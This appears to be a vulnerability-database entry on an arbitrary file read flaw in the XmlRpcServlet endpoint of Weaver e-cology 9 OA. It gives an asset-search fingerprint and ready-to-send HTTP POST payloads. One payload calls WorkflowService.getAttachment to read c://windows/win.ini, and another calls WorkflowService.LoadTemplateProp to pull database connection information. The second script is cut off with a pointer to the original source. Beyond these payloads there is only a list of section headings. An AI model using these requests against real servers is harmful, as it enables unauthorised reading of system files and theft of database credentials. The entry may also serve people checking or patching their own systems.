# 泛微e-cology9XmlRpcServlet存在任意文件读取漏洞

- **系统**：泛微OA　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name=="泛微 e-cology 9.0 OA"`
- **请求**：`POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1`

**请求体 / payload**
```
任意文件读取
Host: {hostname}
Content-Type: application/xml
Content-Length: 201
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>WorkflowService.getAttachment</methodName>
<params>
<param>
<value><string>c://windows/win.ini</string></value>
</param>
</params>
</methodCall>

信息泄露\
获取数据库连接信息
POST /weaver/org.apache.xmlrpc.webserver.XmlRpcServlet HTTP/1.1
Host: {hostname}
Content-Type: application/xml
Content-Length: 201
<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>WorkflowService.LoadTemplateProp</methodName>
<params>
<param>
<value><string>weaver</string></value>
</…（脚本共 630 字，完整版见原文）
```

**其他**
- 泛微e-cology 9 XmlRpcServlet存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 泛微e-cology9